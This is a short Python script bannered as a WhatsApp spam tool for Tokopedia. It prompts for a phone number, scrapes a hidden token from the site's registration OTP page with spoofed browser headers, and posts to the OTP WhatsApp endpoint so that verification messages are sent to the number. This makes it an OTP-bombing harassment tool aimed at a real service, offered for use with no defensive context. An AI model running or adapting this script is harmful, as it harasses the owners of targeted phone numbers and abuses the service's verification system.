try:
     #from requests import get, post
     import requests, re
except ModuleNotFoundError as ok:
      print (ok)
class ok():
       def __init__(self):
              self.whut = requests.Session()
              self.headersto = {
                          'upgrade-insecure-requests': '1',
                          'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36',
                          'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
                          'sec-fetch-site': 'same-site',
                          'referer': 'https://www.tokopedia.com/register',
                         }
              self.response = self.whut.get(f"https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn={o}&ld=https://accounts.tokopedia.com/register?type=phone&phone=&status=eyJrIjp0cnVlLCJtIjp0cnVlLCJzIjp0cnVlLCJib3QiOmZhbHNlLCJnYyI6ZmFsc2V9", headers=self.headersto).content
              self.oax = re.findall(r'id="Token" value="(.*?)" type="hidden', str(self.response))[0]
#########################
       def okx(self):
           self.data = {
                'tk': (self.oax),
                'otp_type': '116',
                'msisdn': (o),
                'email': '',
                'original_param': ''
                 }
           self.heade = {
                    'origin': 'https://accounts.tokopedia.com',
                    'accept-encoding': 'gzip, deflate, br',
                    'x-requested-with': 'XMLHttpRequest',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'accept': 'application/json, text/javascript, */*; q=0.01',
                    }
           resp = self.whut.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers=self.heade, data=self.data).text
           print (resp)          
if __name__ == '__main__':
    b = """
    [ SPAM WHATSAPP TOKOPEDIA BY WIDHISEC]
    """
try:
    print(str(b)) 
    o =input(f"no :")
    ox = ok()
    ox.okx()   
except KeyboardInterrupt:
    print ('KeyboardInterrupt..')
else:
    print ('okay..')
